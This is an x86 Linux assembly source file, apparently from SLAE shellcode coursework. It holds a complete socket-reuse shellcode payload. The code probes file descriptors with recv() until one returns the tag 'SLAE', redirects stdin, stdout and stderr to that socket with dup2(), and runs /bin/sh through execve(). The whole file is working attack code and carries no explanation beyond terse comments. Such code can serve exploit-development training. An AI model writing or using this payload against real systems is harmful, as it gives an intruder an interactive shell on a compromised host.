global _start

section .text
_start:
	xor ebx, ebx
	push ebx
	mov esi, esp			; save buffer in the stack
	push byte +0x40			; flags (MSG_DONTWAIT)
	mov bh, 0xa			; 2560 bytes
	push ebx			; len
	push esi			; buf
	push ebx			; sockfd
	mov ecx, esp			; args
	; ssize_t recv(int, void *, size_t, int)
	xchg bh, bl			; call (now 10 for recv(2))

tag_restart:
	inc word [ecx]			; increment recv(2) descriptor
	push byte +0x66
	; int socketcall(int, unsigned long *)
	pop eax
	int 0x80

	cmp dword [esi], 0x45414c53	; compare received tag with SLAE
	jnz tag_restart			; received buffer is different

	pop edi				; pop the detected file descriptor value
	mov ebx, edi			; fd
	push byte +0x2
	pop ecx				; start by redirecting stderr to it
tag_dup2_loop:
	push byte +0x3f
	; int dup2(int, int)
	pop eax
	int 0x80
	dec ecx				; redirect stdout and stdin, too
	jns tag_dup2_loop		; don't jump if ecx is positive

	push byte +0xb
	; int execve(const char *, char *const [], char *const [])
	pop eax
	cdq				; set edx to zero, as well
	push edx
	push dword 0x68732f2f		; //sh
	push dword 0x6e69622f		; /bin
	mov ebx, esp			; filename
	push edx
	push ebx
	mov ecx, esp			; argv
	int 0x80
